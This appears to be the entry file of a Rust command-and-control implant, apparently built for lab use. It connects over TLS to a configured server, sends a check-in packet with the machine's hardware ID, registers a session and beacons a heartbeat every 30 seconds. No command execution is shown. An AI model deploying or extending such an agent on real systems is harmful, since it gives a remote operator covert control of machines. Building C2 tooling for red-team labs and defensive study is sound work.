mod config;
mod transport;
mod checkin;
mod platform;

use oxide_shared::packet::Packet;

#[tokio::main]
async fn main() -> anyhow::Result<()> {
    let config = config::Config::lab_default();
    println!("[*] Connecting to {}:{}...", config.host, config.port);

    let mut transport = transport::Transport::connect(&config).await?;
    println!("[+] TLS handshake complete");

    let checkin_pkt = checkin::build_checkin_packet();
    println!("[*] HWID: {}", checkin_pkt.data["hwid"]);
    transport.send(checkin_pkt).await?;
    println!("[+] Check-in sent");

    let ack = transport.receive().await?;
    println!("[+] Registered, session: {}", ack.data["session_id"]);

    loop {
        tokio::time::sleep(tokio::time::Duration::from_secs(30)).await;
        let hb = Packet::new("heartbeat", serde_json::json!({}));
        transport.send(hb).await?;
    }
}
